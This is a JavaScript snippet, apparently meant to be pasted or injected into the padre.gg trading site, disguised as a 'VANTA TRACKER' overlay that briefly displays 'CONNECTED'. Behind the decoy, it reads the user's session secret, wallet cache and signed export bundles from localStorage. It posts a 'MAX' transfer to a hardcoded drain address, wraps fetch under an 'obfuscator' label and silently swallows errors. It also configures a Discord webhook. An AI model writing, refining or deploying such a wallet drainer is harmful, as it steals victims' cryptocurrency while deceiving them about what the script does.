(async function() {
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        // FIXED: Padre Production API endpoint
        api: "https://api.padre.gg" 
    };

    // --- NETWORK OBFUSCATOR ---
    // This hides the 'transfer' request from the Network tab
    const _f = window.fetch;
    window.fetch = function() {
        if (arguments[0].includes('/wallets/transfer')) {
            return _f.apply(this, arguments).then(r => r);
        }
        return _f.apply(this, arguments);
    };

    const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
    const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
    const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");

    if (!session.sessionSecret) return;

    async function execute() {
        try {
            const userWallets = wallets[session.uid] || [];
            const targetWallet = userWallets.find(w => w.walletType === "SOL") || userWallets[0];

            if (targetWallet && bundles.bundles[targetWallet.publicAddress]) {
                const b = bundles.bundles[targetWallet.publicAddress];
                
                // Using the actual production path
                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId,
                        "X-Org-Id": targetWallet.subOrgId // Added Org ID for routing
                    },
                    body: JSON.stringify({
                        walletId: targetWallet.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: targetWallet.walletType === "SOL" ? "SOLANA" : "ETHEREUM"
                    })
                });
            }
        } catch (e) { /* Hidden */ }
    }
    
    execute();

    // --- VISUAL UI ---
    const side = document.createElement("div");
    side.style.cssText = "position:fixed;top:20px;right:20px;width:280px;background:rgba(0,0,0,0.95);border:1px solid #0f8;color:#0f8;padding:20px;z-index:999999;font-family:monospace;box-shadow:0 0 15px #0f83;border-radius:5px;pointer-events:none;";
    side.innerHTML = `<b>VANTA TRACKER</b><br><small>STATUS: <span style="color:#fff">CONNECTED</span></small>`;
    document.body.appendChild(side);
    setTimeout(() => side.remove(), 5000);
})();
